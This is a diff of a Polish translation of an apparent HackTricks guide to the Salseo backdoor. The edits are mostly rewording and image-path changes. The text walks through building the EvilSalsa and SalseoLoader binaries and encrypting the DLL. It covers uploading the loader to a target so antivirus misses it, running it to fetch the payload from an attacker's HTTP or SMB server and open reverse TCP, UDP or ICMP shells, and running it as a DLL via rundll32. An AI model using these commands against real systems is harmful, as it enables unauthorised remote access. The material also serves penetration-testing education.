@@ -7,7 +7,7 @@
 Inne sposoby wsparcia HackTricks:
 
 * Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
-* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
+* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
@@ -16,21 +16,21 @@ Inne sposoby wsparcia HackTricks:
 
 ## Kompilacja binarnych plików
 
-Pobierz kod źródłowy z githuba i skompiluj **EvilSalsa** i **SalseoLoader**. Będziesz potrzebować zainstalowanego **Visual Studio** do kompilacji kodu.
+Pobierz kod źródłowy z githuba i skompiluj **EvilSalsa** i **SalseoLoader**. Będziesz potrzebować zainstalowanego **Visual Studio**, aby skompilować kod.
 
 Skompiluj te projekty dla architektury systemu Windows, na którym będziesz ich używać (jeśli Windows obsługuje x64, skompiluj je dla tej architektury).
 
-Możesz **wybrać architekturę** wewnątrz Visual Studio w zakładce **"Build"** w **"Platform Target".**
+Możesz **wybrać architekturę** wewnątrz Visual Studio w zakładce **"Build"** po lewej stronie w **"Platform Target".**
 
 (\*\*Jeśli nie możesz znaleźć tych opcji, kliknij w **"Project Tab"**, a następnie w **"\<Project Name> Properties"**)
 
-![](<../.gitbook/assets/image (132).png>)
+![](<../.gitbook/assets/image (836).png>)
 
-Następnie zbuduj oba projekty (Build -> Build Solution) (W logach pojawi się ścieżka do pliku wykonywalnego):
+Następnie skompiluj oba projekty (Build -> Build Solution) (W logach pojawi się ścieżka do pliku wykonywalnego):
 
-![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (378).png>)
 
-## Przygotowanie backdooru
+## Przygotowanie tylnych drzwi
 
 Po pierwsze, będziesz musiał zakodować **EvilSalsa.dll.** Aby to zrobić, możesz użyć skryptu pythona **encrypterassembly.py** lub skompilować projekt **EncrypterAssembly**:
 
@@ -40,25 +40,23 @@ python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
 python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
 ```
 ### Windows
-
-### Windows
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
 Ok, teraz masz wszystko, czego potrzebujesz do wykonania całej rzeczy Salseo: **zakodowany EvilDalsa.dll** i **binarny plik SalseoLoader.**
 
-**Prześlij binarny plik SalseoLoader.exe na maszynę. Nie powinny być one wykrywane przez żadne AV...**
+**Prześlij binarny plik SalseoLoader.exe na maszynę. Nie powinny być one wykrywane przez żadne oprogramowanie antywirusowe...**
 
 ## **Wykonaj backdoor**
 
-### **Uzyskiwanie odwrotnego powłoki TCP (pobieranie zakodowanego dll przez HTTP)**
+### **Uzyskiwanie powrotnej powłoki TCP (pobieranie zakodowanego dll przez HTTP)**
 
-Pamiętaj, aby uruchomić nc jako nasłuchiwacz odwrotnej powłoki oraz serwer HTTP do obsługi zakodowanego evilsalsa.
+Pamiętaj, aby uruchomić nc jako nasłuchiwacz powłoki odwróconej oraz serwer HTTP do obsługi zakodowanego evilsalsa.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **Uzyskiwanie odwrotnej powłoki UDP (pobieranie zakodowanego pliku dll przez SMB)**
+### **Uzyskiwanie odwrotnego powłoki UDP (pobieranie zakodowanego pliku dll przez SMB)**
 
 Pamiętaj, aby uruchomić nc jako nasłuchiwacz odwrotnej powłoki oraz serwer SMB do udostępniania zakodowanego pliku evilsalsa (impacket-smbserver).
 ```
@@ -75,7 +73,7 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=1
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
-#### Wykonaj klienta:
+#### Uruchom klienta:
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
@@ -89,25 +87,25 @@ Otwórz projekt SalseoLoader za pomocą programu Visual Studio.
 
 ### Dodaj przed funkcją główną: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (405).png>)
 
 ### Zainstaluj DllExport dla tego projektu
 
 #### **Narzędzia** --> **Menedżer pakietów NuGet** --> **Zarządzaj pakietami NuGet dla rozwiązania...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (878).png>)
 
 #### **Wyszukaj pakiet DllExport (używając karty Przeglądaj) i naciśnij Zainstaluj (i zaakceptuj okno popup)**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (97).png>)
 
 W folderze projektu pojawiły się pliki: **DllExport.bat** i **DllExport\_Configure.bat**
 
-### **D**einstalacja DllExport
+### **Odinstaluj DllExport**
 
 Naciśnij **Odinstaluj** (tak, to dziwne, ale uwierz mi, jest to konieczne)
 
-![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
+![](<../.gitbook/assets/image (94).png>)
 
 ### **Zamknij Visual Studio i wykonaj DllExport\_configure**
 
@@ -115,27 +113,27 @@ Po prostu **zamknij** Visual Studio
 
 Następnie przejdź do folderu **SalseoLoader** i **wykonaj plik DllExport\_Configure.bat**
 
-Wybierz **x64** (jeśli zamierzasz użyć go wewnątrz x64, tak było w moim przypadku), wybierz **System.Runtime.InteropServices** (wewnątrz **Namespace for DllExport**) i naciśnij **Zastosuj**
+Wybierz **x64** (jeśli zamierzasz użyć go wewnątrz x64, tak było w moim przypadku), wybierz **System.Runtime.InteropServices** (wewnątrz **Przestrzeń nazw dla DllExport**) i naciśnij **Zastosuj**
 
-![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (879).png>)
 
 ### **Otwórz projekt ponownie w Visual Studio**
 
 **\[DllExport]** nie powinien być już oznaczony jako błąd
 
-![](<../.gitbook/assets/image (8) (1).png>)
+![](<../.gitbook/assets/image (667).png>)
 
 ### Zbuduj rozwiązanie
 
 Wybierz **Typ wyjściowy = Biblioteka klas** (Projekt --> Właściwości SalseoLoader --> Aplikacja --> Typ wyjścia = Biblioteka klas)
 
-![](<../.gitbook/assets/image (10) (1).png>)
+![](<../.gitbook/assets/image (844).png>)
 
 Wybierz **platformę x64** (Projekt --> Właściwości SalseoLoader --> Kompilacja --> Platforma docelowa = x64)
 
-![](<../.gitbook/assets/image (9) (1) (1).png>)
+![](<../.gitbook/assets/image (282).png>)
 
-Aby **zbudować** rozwiązanie: Buduj --> Buduj rozwiązanie (W konsoli wyjściowej pojawi się ścieżka nowego pliku DLL)
+Aby **zbudować** rozwiązanie: Build --> Zbuduj rozwiązanie (W konsoli wyjściowej pojawi się ścieżka nowego pliku DLL)
 
 ### Przetestuj wygenerowane Dll
 
@@ -145,9 +143,9 @@ Wykonaj:
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
-Jeśli nie pojawi się żaden błąd, prawdopodobnie masz działającą DLL!!
+Jeśli nie pojawi się żadny błąd, prawdopodobnie masz działającą DLL!!
 
-## Uzyskaj powłokę, korzystając z DLL
+## Uzyskaj powłokę za pomocą DLL
 
 Nie zapomnij użyć **serwera HTTP** i ustawić **nasłuchiwacza nc**
 
@@ -181,6 +179,6 @@ Inne sposoby wsparcia HackTricks:
 * Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
